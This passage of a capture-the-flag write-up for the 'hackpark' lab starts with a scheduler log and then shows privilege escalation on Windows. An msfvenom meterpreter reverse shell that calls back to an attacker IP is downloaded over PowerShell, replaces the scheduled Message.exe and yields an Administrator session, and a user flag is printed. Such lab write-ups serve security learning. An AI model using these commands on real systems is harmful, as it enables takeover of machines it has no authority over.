08/05/19 14:16:33,Process Ended. PID:1940,ExitCode:4,Message.exe (Administrator)
08/05/19 14:17:00,Event Started Ok, (Administrator)
08/05/19 14:17:33,Process Ended. PID:1656,ExitCode:4,Message.exe (Administrator)
08/05/19 14:18:00,Event Started Ok, (Administrator)
08/05/19 14:18:33,Process Ended. PID:1296,ExitCode:4,Message.exe (Administrator)
08/05/19 14:19:00,Event Started Ok, (Administrator)
08/05/19 14:19:33,Process Ended. PID:1884,ExitCode:4,Message.exe (Administrator)
08/05/19 14:20:00,Event Started Ok, (Administrator)
08/05/19 14:20:34,Process Ended. PID:1108,ExitCode:4,Message.exe (Administrator)
08/05/19 14:21:00,Event Started Ok, (Administrator)
08/05/19 14:21:33,Process Ended. PID:1664,ExitCode:4,Message.exe (Administrator)
08/05/19 14:22:00,Event Started Ok, (Administrator)
08/05/19 14:22:34,Process Ended. PID:1748,ExitCode:4,Message.exe (Administrator)
08/05/19 14:23:00,Event Started Ok, (Administrator)
08/05/19 14:23:33,Process Ended. PID:1168,ExitCode:4,Message.exe (Administrator)
08/05/19 14:24:01,Event Started Ok, (Administrator)
08/05/19 14:24:34,Process Ended. PID:1904,ExitCode:4,Message.exe (Administrator)
08/05/19 14:25:00,Event Started Ok, (Administrator)
08/05/19 14:25:33,Process Ended. PID:1296,ExitCode:4,Message.exe (Administrator)
08/05/19 14:26:00,Event Started Ok, (Administrator)
08/05/19 14:26:34,Process Ended. PID:1192,ExitCode:4,Message.exe (Administrator)
08/05/19 14:27:00,Event Started Ok, (Administrator)
08/05/19 14:27:03,Process Ended. PID:96,ExitCode:1,Message.exe (Administrator)
08/05/19 14:28:00,Event Started Ok, (Administrator)
08/05/19 14:28:33,Process Ended. PID:1980,ExitCode:4,Message.exe (Administrator)
08/05/19 14:29:00,Event Started Ok, (Administrator)
08/05/19 14:29:34,Process Ended. PID:1396,ExitCode:4,Message.exe (Administrator)
08/05/19 14:30:00,Event Started Ok, (Administrator)
08/05/19 14:30:33,Process Ended. PID:716,ExitCode:4,Message.exe (Administrator)
08/05/19 14:31:00,Event Started Ok, (Administrator)
08/05/19 14:31:34,Process Ended. PID:1580,ExitCode:4,Message.exe (Administrator)
08/05/19 14:32:00,Event Started Ok, (Administrator)
08/05/19 14:32:33,Process Ended. PID:1740,ExitCode:4,Message.exe (Administrator)
08/05/19 14:33:00,Event Started Ok, (Administrator)
08/05/19 14:33:33,Process Ended. PID:652,ExitCode:4,Message.exe (Administrator)
08/05/19 14:34:00,Event Started Ok, (Administrator)
08/05/19 14:34:33,Process Ended. PID:1580,ExitCode:4,Message.exe (Administrator)
08/05/19 14:35:00,Event Started Ok, (Administrator)
08/05/19 14:35:33,Process Ended. PID:932,ExitCode:4,Message.exe (Administrator)
08/05/19 14:36:00,Event Started Ok, (Administrator)
08/05/19 14:36:33,Process Ended. PID:1520,ExitCode:4,Message.exe (Administrator)
08/05/19 14:37:00,Event Started Ok, (Administrator)
08/05/19 14:37:33,Process Ended. PID:952,ExitCode:4,Message.exe (Administrator)
08/05/19 14:38:00,Event Started Ok, (Administrator)
08/05/19 14:38:33,Process Ended. PID:1960,ExitCode:4,Message.exe (Administrator)
08/05/19 14:39:00,Event Started Ok, (Administrator)
08/05/19 14:39:33,Process Ended. PID:1336,ExitCode:4,Message.exe (Administrator)
08/05/19 14:40:00,Event Started Ok, (Administrator)
08/05/19 14:40:33,Process Ended. PID:1940,ExitCode:4,Message.exe (Administrator)
08/05/19 14:41:00,Event Started Ok, (Administrator)
08/05/19 14:41:33,Process Ended. PID:604,ExitCode:4,Message.exe (Administrator)
08/05/19 14:42:00,Event Started Ok, (Administrator)
08/05/19 14:42:33,Process Ended. PID:204,ExitCode:4,Message.exe (Administrator)
08/06/19 14:12:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
08/06/19 14:13:04,Event Started Ok, (Administrator)
08/06/19 14:13:36,Process Ended. PID:2788,ExitCode:4,Message.exe (Administrator)
08/06/19 14:14:01,Event Started Ok, (Administrator)
08/06/19 14:14:33,Process Ended. PID:2728,ExitCode:4,Message.exe (Administrator)
08/06/19 14:15:01,Event Started Ok, (Administrator)
08/06/19 14:15:34,Process Ended. PID:2776,ExitCode:4,Message.exe (Administrator)
08/06/19 14:16:01,Event Started Ok, (Administrator)
10/02/20 14:13:02,Event Started Ok, (Administrator)
10/02/20 14:13:33,Process Ended. PID:3352,ExitCode:4,Message.exe (Administrator)
10/02/20 14:14:02,Event Started Ok, (Administrator)
10/02/20 14:14:33,Process Ended. PID:3312,ExitCode:4,Message.exe (Administrator)
10/02/20 14:15:00,Event Started Ok, (Administrator)
10/02/20 14:15:24,Process Ended. PID:1944,ExitCode:1,Message.exe (Administrator)
10/02/20 14:16:00,Event Started Ok, (Administrator)
10/02/20 14:16:33,Process Ended. PID:3712,ExitCode:4,Message.exe (Administrator)
10/02/20 14:17:01,Event Started Ok, (Administrator)
10/02/20 14:17:04,Process Ended. PID:3308,ExitCode:1,Message.exe (Administrator)
10/02/20 14:18:02,Event Started Ok, (Administrator)
10/02/20 14:18:34,Process Ended. PID:3896,ExitCode:4,Message.exe (Administrator)
10/02/20 14:19:01,Event Started Ok, (Administrator)
10/02/20 14:19:33,Process Ended. PID:3384,ExitCode:4,Message.exe (Administrator)
10/02/20 14:20:01,Event Started Ok, (Administrator)
10/02/20 14:20:17,Process Ended. PID:3748,ExitCode:1,Message.exe (Administrator)
10/02/20 14:21:02,Event Started Ok, (Administrator)
10/02/20 14:21:34,Process Ended. PID:476,ExitCode:4,Message.exe (Administrator)
10/02/20 14:22:01,Event Started Ok, (Administrator)
10/02/20 14:22:05,Process Ended. PID:904,ExitCode:1,Message.exe (Administrator)
10/02/20 14:23:00,Event Started Ok, (Administrator)
10/02/20 14:23:15,Process Ended. PID:1740,ExitCode:1,Message.exe (Administrator)
10/02/20 14:24:01,Event Started Ok, (Administrator)
10/02/20 14:24:03,Process Ended. PID:2116,ExitCode:1,Message.exe (Administrator)
10/02/20 14:25:00,Event Started Ok, (Administrator)
10/02/20 14:25:03,Process Ended. PID:948,ExitCode:1,Message.exe (Administrator)
10/02/20 14:26:02,Event Started Ok, (Administrator)
10/02/20 14:26:03,Process Ended. PID:3276,ExitCode:1,Message.exe (Administrator)
10/02/20 14:27:01,Event Started Ok, (Administrator)
10/02/20 14:27:04,Process Ended. PID:3892,ExitCode:1,Message.exe (Administrator)
10/02/20 14:28:01,Event Started Ok, (Administrator)
10/02/20 14:28:04,Process Ended. PID:3236,ExitCode:1,Message.exe (Administrator)
10/02/20 14:29:01,Event Started Ok, (Administrator)
10/02/20 14:29:06,Process Ended. PID:3700,ExitCode:1,Message.exe (Administrator)
10/02/20 14:30:01,Event Started Ok, (Administrator)
10/02/20 14:30:04,Process Ended. PID:2280,ExitCode:1,Message.exe (Administrator)
10/02/20 14:32:02,Event Started Ok, (Administrator)
10/02/20 14:32:33,Process Ended. PID:2904,ExitCode:4,Message.exe (Administrator)
10/02/20 14:33:02,Event Started Ok, (Administrator)
10/02/20 14:33:03,Process Ended. PID:3556,ExitCode:1,Message.exe (Administrator)
10/02/20 14:34:02,Event Started Ok, (Administrator)
10/02/20 14:34:03,Process Ended. PID:2596,ExitCode:1,Message.exe (Administrator)
10/02/20 14:35:01,Event Started Ok, (Administrator)
10/02/20 14:35:04,Process Ended. PID:3292,ExitCode:1,Message.exe (Administrator)
10/02/20 14:36:00,Event Started Ok, (Administrator)
10/02/20 14:36:05,Process Ended. PID:2788,ExitCode:1,Message.exe (Administrator)
10/02/20 14:37:01,Event Started Ok, (Administrator)
10/02/20 14:37:33,Process Ended. PID:3196,ExitCode:4,Message.exe (Administrator)
10/02/20 14:38:01,Event Started Ok, (Administrator)
10/02/20 14:38:03,Process Ended. PID:2512,ExitCode:1,Message.exe (Administrator)
10/02/20 14:39:01,Event Started Ok, (Administrator)
10/02/20 14:39:04,Process Ended. PID:2748,ExitCode:1,Message.exe (Administrator)
10/02/20 14:40:01,Event Started Ok, (Administrator)
10/02/20 14:40:04,Process Ended. PID:3584,ExitCode:1,Message.exe (Administrator)
10/02/20 14:41:01,Event Started Ok, (Administrator)
10/02/20 14:41:03,Process Ended. PID:3280,ExitCode:1,Message.exe (Administrator)
10/02/20 14:42:00,Event Started Ok, (Administrator)
10/02/20 14:42:04,Process Ended. PID:2300,ExitCode:1,Message.exe (Administrator)
10/02/20 14:43:01,Event Started Ok, (Administrator)
10/02/20 14:43:08,Process Ended. PID:3452,ExitCode:1,Message.exe (Administrator)
10/02/20 14:44:01,Event Started Ok, (Administrator)
10/02/20 14:44:05,Process Ended. PID:552,ExitCode:1,Message.exe (Administrator)
10/02/20 14:45:01,Event Started Ok, (Administrator)
10/02/20 14:45:33,Process Ended. PID:3972,ExitCode:4,Message.exe (Administrator)
10/02/20 14:46:00,Event Started Ok, (Administrator)
10/02/20 14:46:04,Process Ended. PID:3360,ExitCode:1,Message.exe (Administrator)
10/02/20 14:47:00,Event Started Ok, (Administrator)
10/02/20 14:47:05,Process Ended. PID:3536,ExitCode:1,Message.exe (Administrator)
10/02/20 14:48:00,Event Started Ok, (Administrator)
10/02/20 14:48:03,Process Ended. PID:2956,ExitCode:1,Message.exe (Administrator)
10/02/20 14:51:01,Event Started Ok, (Administrator)
10/02/20 14:51:33,Process Ended. PID:3732,ExitCode:4,Message.exe (Administrator)
10/02/20 14:52:00,Event Started Ok, (Administrator)
10/02/20 14:52:19,Process Ended. PID:4076,ExitCode:1,Message.exe (Administrator)
10/02/20 14:53:01,Event Started Ok, (Administrator)
10/02/20 14:53:31,Process Ended. PID:3728,ExitCode:4,Message.exe (Administrator)
10/02/20 14:54:00,Event Started Ok, (Administrator)
10/02/20 14:54:10,Process Ended. PID:3464,ExitCode:1,Message.exe (Administrator)
10/02/20 14:55:00,Event Started Ok, (Administrator)
10/02/20 14:55:05,Process Ended. PID:3488,ExitCode:1,Message.exe (Administrator)
10/02/20 14:56:01,Event Started Ok, (Administrator)
10/02/20 14:56:33,Process Ended. PID:4040,ExitCode:4,Message.exe (Administrator)
10/02/20 14:57:00,Event Started Ok, (Administrator)
10/02/20 14:57:07,Process Ended. PID:3460,ExitCode:1,Message.exe (Administrator)
10/02/20 14:58:01,Event Started Ok, (Administrator)
10/02/20 14:58:33,Process Ended. PID:3264,ExitCode:4,Message.exe (Administrator)
10/02/20 14:59:00,Event Started Ok, (Administrator)
10/02/20 14:59:34,Process Ended. PID:1244,ExitCode:4,Message.exe (Administrator)
10/02/20 15:00:01,Event Started Ok, (Administrator)
10/02/20 15:00:33,Process Ended. PID:3680,ExitCode:4,Message.exe (Administrator)
10/02/20 15:01:00,Event Started Ok, (Administrator)
10/02/20 15:01:34,Process Ended. PID:3536,ExitCode:4,Message.exe (Administrator)
10/02/20 15:02:01,Event Started Ok, (Administrator)
10/02/20 15:02:33,Process Ended. PID:2044,ExitCode:4,Message.exe (Administrator)
10/02/20 15:03:01,Event Started Ok, (Administrator)
10/02/20 15:03:03,Process Ended. PID:2248,ExitCode:1,Message.exe (Administrator)
10/02/20 15:05:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
10/02/20 15:07:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
10/02/20 15:08:02,Event Started Ok, (Administrator)
10/02/20 15:08:33,Process Ended. PID:2396,ExitCode:4,Message.exe (Administrator)
10/02/20 15:09:00,Event Started Ok, (Administrator)
10/02/20 15:09:33,Process Ended. PID:2636,ExitCode:4,Message.exe (Administrator)
10/02/20 15:10:00,Event Started Ok, (Administrator)
10/02/20 15:10:07,Process Ended. PID:1760,ExitCode:1,Message.exe (Administrator)
09/27/22 09:49:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
09/27/22 09:50:01,Event Started Ok, (Administrator)
09/27/22 09:50:33,Process Ended. PID:2764,ExitCode:4,Message.exe (Administrator)
09/27/22 09:51:01,Event Started Ok, (Administrator)
09/27/22 09:51:33,Process Ended. PID:648,ExitCode:4,Message.exe (Administrator)
09/27/22 09:52:01,Event Started Ok, (Administrator)
09/27/22 09:52:33,Process Ended. PID:2744,ExitCode:4,Message.exe (Administrator)
09/27/22 09:53:01,Event Started Ok, (Administrator)
09/27/22 09:53:33,Process Ended. PID:2792,ExitCode:4,Message.exe (Administrator)
09/27/22 09:54:00,Event Started Ok, (Administrator)
09/27/22 09:54:34,Process Ended. PID:384,ExitCode:4,Message.exe (Administrator)
09/27/22 09:55:01,Event Started Ok, (Administrator)
09/27/22 09:55:33,Process Ended. PID:720,ExitCode:4,Message.exe (Administrator)
09/27/22 09:56:01,Event Started Ok, (Administrator)
09/27/22 09:56:33,Process Ended. PID:2936,ExitCode:4,Message.exe (Administrator)
09/27/22 09:57:01,Event Started Ok, (Administrator)
09/27/22 09:57:33,Process Ended. PID:1336,ExitCode:4,Message.exe (Administrator)
09/27/22 09:58:02,Event Started Ok, (Administrator)
09/27/22 09:58:34,Process Ended. PID:2720,ExitCode:4,Message.exe (Administrator)
09/27/22 09:59:01,Event Started Ok, (Administrator)
09/27/22 09:59:34,Process Ended. PID:1952,ExitCode:4,Message.exe (Administrator)
09/27/22 10:00:01,Event Started Ok, (Administrator)
09/27/22 10:00:33,Process Ended. PID:1852,ExitCode:4,Message.exe (Administrator)
09/27/22 10:01:01,Event Started Ok, (Administrator)
09/27/22 10:01:33,Process Ended. PID:2944,ExitCode:4,Message.exe (Administrator)
09/27/22 10:02:02,Event Started Ok, (Administrator)
09/27/22 10:02:34,Process Ended. PID:2336,ExitCode:4,Message.exe (Administrator)
09/27/22 10:03:01,Event Started Ok, (Administrator)
09/27/22 10:03:34,Process Ended. PID:3048,ExitCode:4,Message.exe (Administrator)
09/27/22 10:04:01,Event Started Ok, (Administrator)
09/27/22 10:04:33,Process Ended. PID:1704,ExitCode:4,Message.exe (Administrator)
09/27/22 10:05:01,Event Started Ok, (Administrator)
09/27/22 10:05:33,Process Ended. PID:1944,ExitCode:4,Message.exe (Administrator)
09/27/22 10:06:01,Event Started Ok, (Administrator)
09/27/22 10:06:33,Process Ended. PID:2608,ExitCode:4,Message.exe (Administrator)
09/27/22 10:07:02,Event Started Ok, (Administrator)
09/27/22 10:07:34,Process Ended. PID:2956,ExitCode:4,Message.exe (Administrator)
09/27/22 10:08:01,Event Started Ok, (Administrator)
09/27/22 10:08:34,Process Ended. PID:2776,ExitCode:4,Message.exe (Administrator)
09/27/22 10:09:01,Event Started Ok, (Administrator)
09/27/22 10:09:33,Process Ended. PID:484,ExitCode:4,Message.exe (Administrator)
09/27/22 10:10:01,Event Started Ok, (Administrator)
09/27/22 10:10:33,Process Ended. PID:908,ExitCode:4,Message.exe (Administrator)
09/27/22 10:11:01,Event Started Ok, (Administrator)
09/27/22 10:11:33,Process Ended. PID:2760,ExitCode:4,Message.exe (Administrator)
09/27/22 10:12:02,Event Started Ok, (Administrator)
09/27/22 10:12:34,Process Ended. PID:1968,ExitCode:4,Message.exe (Administrator)
09/27/22 10:13:01,Event Started Ok, (Administrator)
09/27/22 10:13:34,Process Ended. PID:3004,ExitCode:4,Message.exe (Administrator)
09/27/22 10:14:01,Event Started Ok, (Administrator)
09/27/22 10:14:34,Process Ended. PID:2400,ExitCode:4,Message.exe (Administrator)
09/27/22 10:15:01,Event Started Ok, (Administrator)
09/27/22 10:15:33,Process Ended. PID:2508,ExitCode:4,Message.exe (Administrator)
09/27/22 10:16:01,Event Started Ok, (Administrator)
09/27/22 10:16:33,Process Ended. PID:1872,ExitCode:4,Message.exe (Administrator)
09/27/22 10:17:01,Event Started Ok, (Administrator)
09/27/22 10:17:34,Process Ended. PID:2836,ExitCode:4,Message.exe (Administrator)
09/27/22 10:18:01,Event Started Ok, (Administrator)
09/27/22 10:18:34,Process Ended. PID:2224,ExitCode:4,Message.exe (Administrator)
09/27/22 10:19:01,Event Started Ok, (Administrator)
09/27/22 10:19:33,Process Ended. PID:2384,ExitCode:4,Message.exe (Administrator)
09/27/22 10:20:01,Event Started Ok, (Administrator)
09/27/22 10:20:33,Process Ended. PID:2752,ExitCode:4,Message.exe (Administrator)
09/27/22 10:21:01,Event Started Ok, (Administrator)
09/27/22 10:21:33,Process Ended. PID:2744,ExitCode:4,Message.exe (Administrator)
09/27/22 10:22:02,Event Started Ok, (Administrator)
09/27/22 10:22:34,Process Ended. PID:644,ExitCode:4,Message.exe (Administrator)
09/27/22 10:23:01,Event Started Ok, (Administrator)
09/27/22 10:23:34,Process Ended. PID:2204,ExitCode:4,Message.exe (Administrator)
09/27/22 10:24:01,Event Started Ok, (Administrator)
09/27/22 10:24:33,Process Ended. PID:1696,ExitCode:4,Message.exe (Administrator)
09/27/22 10:25:01,Event Started Ok, (Administrator)
09/27/22 10:25:33,Process Ended. PID:1780,ExitCode:4,Message.exe (Administrator)
09/27/22 10:26:01,Event Started Ok, (Administrator)
09/27/22 10:26:33,Process Ended. PID:2232,ExitCode:4,Message.exe (Administrator)
09/27/22 10:27:02,Event Started Ok, (Administrator)
09/27/22 10:27:34,Process Ended. PID:2796,ExitCode:4,Message.exe (Administrator)
09/27/22 10:28:00,Event Started Ok, (Administrator)
09/27/22 10:28:34,Process Ended. PID:1704,ExitCode:4,Message.exe (Administrator)
09/27/22 10:29:01,Event Started Ok, (Administrator)
09/27/22 10:29:33,Process Ended. PID:768,ExitCode:4,Message.exe (Administrator)
09/27/22 10:30:01,Event Started Ok, (Administrator)
09/27/22 10:30:33,Process Ended. PID:3036,ExitCode:4,Message.exe (Administrator)
09/27/22 10:31:01,Event Started Ok, (Administrator)
09/27/22 10:31:33,Process Ended. PID:2720,ExitCode:4,Message.exe (Administrator)
09/27/22 10:32:02,Event Started Ok, (Administrator)
09/27/22 10:32:34,Process Ended. PID:844,ExitCode:4,Message.exe (Administrator)
09/27/22 10:33:00,Event Started Ok, (Administrator)
09/27/22 10:33:34,Process Ended. PID:984,ExitCode:4,Message.exe (Administrator)
09/27/22 10:34:00,Event Started Ok, (Administrator)
09/27/22 10:34:33,Process Ended. PID:768,ExitCode:4,Message.exe (Administrator)
09/27/22 10:35:01,Event Started Ok, (Administrator)
09/27/22 10:35:33,Process Ended. PID:3004,ExitCode:4,Message.exe (Administrator)
09/27/22 10:36:01,Event Started Ok, (Administrator)
09/27/22 10:36:33,Process Ended. PID:1832,ExitCode:4,Message.exe (Administrator)
09/27/22 10:37:02,Event Started Ok, (Administrator)
09/27/22 10:37:34,Process Ended. PID:1336,ExitCode:4,Message.exe (Administrator)
09/27/22 10:38:01,Event Started Ok, (Administrator)
09/27/22 10:38:34,Process Ended. PID:484,ExitCode:4,Message.exe (Administrator)
09/27/22 10:39:01,Event Started Ok, (Administrator)
09/27/22 10:39:33,Process Ended. PID:2816,ExitCode:4,Message.exe (Administrator)
09/27/22 10:40:00,Event Started Ok, (Administrator)
09/27/22 10:40:33,Process Ended. PID:1288,ExitCode:4,Message.exe (Administrator)
09/27/22 10:41:01,Event Started Ok, (Administrator)
09/27/22 10:41:33,Process Ended. PID:2864,ExitCode:4,Message.exe (Administrator)
09/27/22 10:42:02,Event Started Ok, (Administrator)
09/27/22 10:42:34,Process Ended. PID:2412,ExitCode:4,Message.exe (Administrator)
09/27/22 10:43:01,Event Started Ok, (Administrator)
09/27/22 10:43:34,Process Ended. PID:1904,ExitCode:4,Message.exe (Administrator)
09/27/22 10:44:01,Event Started Ok, (Administrator)
09/27/22 10:44:33,Process Ended. PID:1280,ExitCode:4,Message.exe (Administrator)
09/27/22 10:45:01,Event Started Ok, (Administrator)
09/27/22 10:45:33,Process Ended. PID:1780,ExitCode:4,Message.exe (Administrator)
09/27/22 10:46:01,Event Started Ok, (Administrator)
09/27/22 10:46:33,Process Ended. PID:2320,ExitCode:4,Message.exe (Administrator)
09/27/22 10:47:02,Event Started Ok, (Administrator)
09/27/22 10:47:34,Process Ended. PID:2120,ExitCode:4,Message.exe (Administrator)
09/27/22 10:48:01,Event Started Ok, (Administrator)
09/27/22 10:48:34,Process Ended. PID:1208,ExitCode:4,Message.exe (Administrator)
09/27/22 10:49:01,Event Started Ok, (Administrator)
09/27/22 10:49:33,Process Ended. PID:2436,ExitCode:4,Message.exe (Administrator)
09/27/22 10:50:01,Event Started Ok, (Administrator)
09/27/22 10:50:33,Process Ended. PID:2452,ExitCode:4,Message.exe (Administrator)
09/27/22 10:51:01,Event Started Ok, (Administrator)
09/27/22 10:51:33,Process Ended. PID:2400,ExitCode:4,Message.exe (Administrator)
09/27/22 10:52:00,Event Started Ok, (Administrator)
09/27/22 10:52:34,Process Ended. PID:2692,ExitCode:4,Message.exe (Administrator)
09/27/22 10:53:01,Event Started Ok, (Administrator)
09/27/22 10:53:34,Process Ended. PID:1456,ExitCode:4,Message.exe (Administrator)
09/27/22 10:54:01,Event Started Ok, (Administrator)
09/27/22 10:54:34,Process Ended. PID:2904,ExitCode:4,Message.exe (Administrator)
09/27/22 10:55:01,Event Started Ok, (Administrator)
09/27/22 10:55:33,Process Ended. PID:2448,ExitCode:4,Message.exe (Administrator)
09/27/22 10:56:01,Event Started Ok, (Administrator)
09/27/22 10:56:33,Process Ended. PID:3004,ExitCode:4,Message.exe (Administrator)
09/27/22 10:57:01,Event Started Ok, (Administrator)
09/27/22 10:57:33,Process Ended. PID:1180,ExitCode:4,Message.exe (Administrator)
09/27/22 10:58:02,Event Started Ok, (Administrator)
09/27/22 10:58:34,Process Ended. PID:1456,ExitCode:4,Message.exe (Administrator)
09/27/22 10:59:01,Event Started Ok, (Administrator)
09/27/22 10:59:33,Process Ended. PID:1948,ExitCode:4,Message.exe (Administrator)
09/27/22 11:00:01,Event Started Ok, (Administrator)
09/27/22 11:00:33,Process Ended. PID:2956,ExitCode:4,Message.exe (Administrator)
09/27/22 11:01:01,Event Started Ok, (Administrator)
09/27/22 11:01:33,Process Ended. PID:1624,ExitCode:4,Message.exe (Administrator)
09/27/22 11:02:01,Event Started Ok, (Administrator)
09/27/22 11:02:33,Process Ended. PID:2508,ExitCode:4,Message.exe (Administrator)
09/27/22 11:03:02,Event Started Ok, (Administrator)
09/27/22 11:03:34,Process Ended. PID:2864,ExitCode:4,Message.exe (Administrator)
09/27/22 11:04:01,Event Started Ok, (Administrator)
09/27/22 11:04:34,Process Ended. PID:480,ExitCode:4,Message.exe (Administrator)
09/27/22 11:05:01,Event Started Ok, (Administrator)
09/27/22 11:05:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)
09/27/22 11:06:01,Event Started Ok, (Administrator)
09/27/22 11:06:33,Process Ended. PID:1904,ExitCode:4,Message.exe (Administrator)
09/27/22 11:07:01,Event Started Ok, (Administrator)
09/27/22 11:07:33,Process Ended. PID:2336,ExitCode:4,Message.exe (Administrator)
09/27/22 11:08:01,Event Started Ok, (Administrator)
```
What is the name of the binary you're supposed to exploit?
have you checked for logs for the abnormal service?
*Message.exe*
```text
meterpreter > cd "c:\users"
```
```text
meterpreter > ls
Listing: c:\users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2019-08-03 14:15:04 -0400  .NET v4.5
040777/rwxrwxrwx  8192  dir   2019-08-03 14:15:04 -0400  .NET v4.5 Classic
040777/rwxrwxrwx  8192  dir   2019-08-05 17:03:44 -0400  Administrator
040777/rwxrwxrwx  0     dir   2013-08-22 10:48:41 -0400  All Users
040555/r-xr-xr-x  8192  dir   2014-03-21 15:16:56 -0400  Default
040777/rwxrwxrwx  0     dir   2013-08-22 10:48:41 -0400  Default User
040555/r-xr-xr-x  4096  dir   2013-08-22 11:39:32 -0400  Public
100666/rw-rw-rw-  174   fil   2013-08-22 11:37:57 -0400  desktop.ini
040777/rwxrwxrwx  8192  dir   2019-08-04 14:54:53 -0400  jeff
```
```text
meterpreter > cd jeff
[-] stdapi_fs_chdir: Operation failed: Access is denied.

Time to replace C:\Program Files (x86)\SystemScheduler\Message.exe with a reverse shell. Let’s first generate a new reverse shell (use a new port) that we will name Message.exe: 

stop this meterpreter in order to work then create a new one to get admin priv
```
```text
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.81.220 LPORT=3456 -f exe -o Message.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: Message.exe
```
```text
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.97.210 - - [27/Sep/2022 14:15:18] "GET /Message.exe HTTP/1.1" 200 -
10.10.97.210 - - [27/Sep/2022 14:17:03] "GET /Message.exe HTTP/1.1" 200 -
10.10.97.210 - - [27/Sep/2022 14:26:48] "GET /Message.exe HTTP/1.1" 200 -

c:\Windows\Temp>cd "C:\Program Files (x86)\SystemScheduler
ls
C:\Program Files (x86)\SystemScheduler>ls
dir
C:\Program Files (x86)\SystemScheduler>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of C:\Program Files (x86)\SystemScheduler
08/04/2019  04:37 AM    <DIR>          .
08/04/2019  04:37 AM    <DIR>          ..
05/17/2007  01:47 PM             1,150 alarmclock.ico
08/31/2003  12:06 PM               766 clock.ico
08/31/2003  12:06 PM            80,856 ding.wav
09/27/2022  11:19 AM    <DIR>          Events
08/04/2019  04:36 AM                60 Forum.url
01/08/2009  08:21 PM         1,637,972 libeay32.dll
11/16/2004  12:16 AM             9,813 License.txt
09/27/2022  09:48 AM             1,496 LogFile.txt
09/27/2022  09:49 AM             3,760 LogfileAdvanced.txt
03/25/2018  10:58 AM           536,992 Message.exe
03/25/2018  10:59 AM           445,344 PlaySound.exe
03/25/2018  10:58 AM            27,040 PlayWAV.exe
08/04/2019  03:05 PM               149 Preferences.ini
03/25/2018  10:58 AM           485,792 Privilege.exe
03/24/2018  12:09 PM            10,100 ReadMe.txt
03/25/2018  10:58 AM           112,544 RunNow.exe
03/25/2018  10:59 AM            40,352 sc32.exe
08/31/2003  12:06 PM               766 schedule.ico
03/25/2018  10:58 AM         1,633,696 Scheduler.exe
03/25/2018  10:59 AM           491,936 SendKeysHelper.exe
03/25/2018  10:58 AM           437,664 ShowXY.exe
03/25/2018  10:58 AM           439,712 ShutdownGUI.exe
03/25/2018  10:58 AM           235,936 SSAdmin.exe
03/25/2018  10:58 AM           731,552 SSCmd.exe
01/08/2009  08:12 PM           355,446 ssleay32.dll
03/25/2018  10:58 AM           456,608 SSMail.exe
08/04/2019  04:36 AM             6,999 unins000.dat
08/04/2019  04:36 AM           722,597 unins000.exe
08/04/2019  04:36 AM                54 Website.url
06/26/2009  05:27 PM             6,574 whiteclock.ico
03/25/2018  10:58 AM            76,704 WhoAmI.exe
05/16/2006  04:49 PM           785,042 WSCHEDULER.CHM
05/16/2006  03:58 PM             2,026 WScheduler.cnt
03/25/2018  10:58 AM           331,168 WScheduler.exe
05/16/2006  04:58 PM           703,081 WSCHEDULER.HLP
03/25/2018  10:58 AM           136,096 WSCtrl.exe
03/25/2018  10:58 AM            98,720 WService.exe
03/25/2018  10:58 AM            68,512 WSLogon.exe
03/25/2018  10:59 AM            33,184 WSProc.dll
              38 File(s)     11,148,259 bytes
               3 Dir(s)  39,125,901,312 bytes free
.\Message.exe
C:\Program Files (x86)\SystemScheduler>.\Message.exe
powershell -c "Invoke-WebRequest -Uri 'http://10.11.81.220:8000/Message.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"
.\Message.exe
```
```text
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ msfconsole -q
```
```text
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```
```text
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
```
```text
msf6 exploit(multi/handler) > set LHOST 10.11.81.220
LHOST => 10.11.81.220
```
```text
msf6 exploit(multi/handler) > set LPORT 3456
LPORT => 3456
```
```text
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.81.220:3456 
[*] Sending stage (175686 bytes) to 10.10.97.210
[*] Meterpreter session 1 opened (10.11.81.220:3456 -> 10.10.97.210:49328) at 2022-09-27 14:27:05 -0400
```
```text
meterpreter > getuid
Server username: HACKPARK\Administrator
```
```text
meterpreter > cd c:\users\jeff\desktop\
 > ls
[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
```
```text
meterpreter > cd "C:\Users\jeff\Desktop\"
[-] Parse error: Unmatched quote: "cd \"C:\\Users\\jeff\\Desktop\\\""
```
```text
meterpreter > cd 'C:\Users\jeff\Desktop\'
```
```text
meterpreter > ls
Listing: C:\Users\jeff\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-08-04 14:54:53 -0400  desktop.ini
100666/rw-rw-rw-  32    fil   2019-08-04 14:57:10 -0400  user.txt
```
```text
meterpreter > cat user.txt
759bd8af507517bcfaede78a21a73e39
```
```text
meterpreter > cd 'C:\Users\Administrator\Desktop\'
```
```text
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  1029  fil   2019-08-04 07:36:42 -0400  System Scheduler.lnk
100666/rw-rw-rw-  282   fil   2019-08-03 13:43:54 -0400  desktop.ini
100666/rw-rw-rw-  32    fil   2019-08-04 14:51:42 -0400  root.txt
```
```text
